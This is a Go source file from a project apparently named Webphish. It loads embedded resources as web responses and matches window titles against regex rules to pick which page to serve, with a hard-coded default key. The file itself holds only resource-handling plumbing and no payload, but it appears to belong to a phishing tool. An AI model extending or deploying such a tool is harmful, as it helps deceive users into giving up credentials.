package resource

import (
	"Webphish/internal"
	"Webphish/internal/edge"
	"Webphish/internal/logger"
	"Webphish/resources"
	"encoding/xml"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"
)

const DefaultKey = "zazalul"

type File struct {
	Content     []byte
	Path        string
	IsDirectory bool
}

type Loader interface {
	Get(title string) edge.WebResponse
	Put(file *File) internal.ErrorCode
	HasMatchingResources(title string) bool
	MatchingResource(title string) (string, internal.ErrorCode)
}

type Client interface {
	Get() ([]byte, internal.ErrorCode)
}

type Decoder interface {
	Decode(data []byte) ([]File, internal.ErrorCode)
}

type TitleMatch struct {
	XMLName              xml.Name `xml:"rm"`
	Name                 string   `xml:"name"`
	MatchingResourcePath string   `xml:"matches"`
}

type Configuration struct {
	XMLName          xml.Name      `xml:"wi"`
	ResourceMatchers []*TitleMatch `xml:"res>rm"`
}

func LoadResource(uri string) edge.WebResponse {
	var parsed *url.URL
	var path string
	var fileContent []byte
	var contentType edge.ContentType
	var err error

	if parsed, err = url.Parse(uri); err != nil {
		logger.Fatalf("Failed to load resource for: %s. Error: %s", uri, err.Error())
	}

	path = parsed.Path
	path = strings.TrimPrefix(path, "/")
	//console.MessageBoxPlain("Loading resource", path)
	fileExtension := filepath.Ext(path)
	contentType = edge.GetContentType(fileExtension)
	//console.MessageBoxPlain("Content type: ", string(contentType))
	fileContent, err = resources.GetResource(path)
	if err != nil {
		//console.MessageBoxPlain("Failed to content", "No content")
		logger.Fatalf("Failed to get content for file: %s. Error: %s", path, err.Error())
	}
	return edge.OK(fileContent, contentType)
}

func GetMatchingResource(title string) (path string, err int) {
	var conf *resources.Configuration
	conf = resources.GetConfiguration()
	if conf == nil {
		return "", -1
	}
	for _, matcher := range conf.ResourceMatchers {
		matched, _ := regexp.MatchString(matcher.Name, title)
		if matched {
			return matcher.MatchingResourcePath, internal.GenericSuccess
		}
	}
	return "", internal.GenericError
}
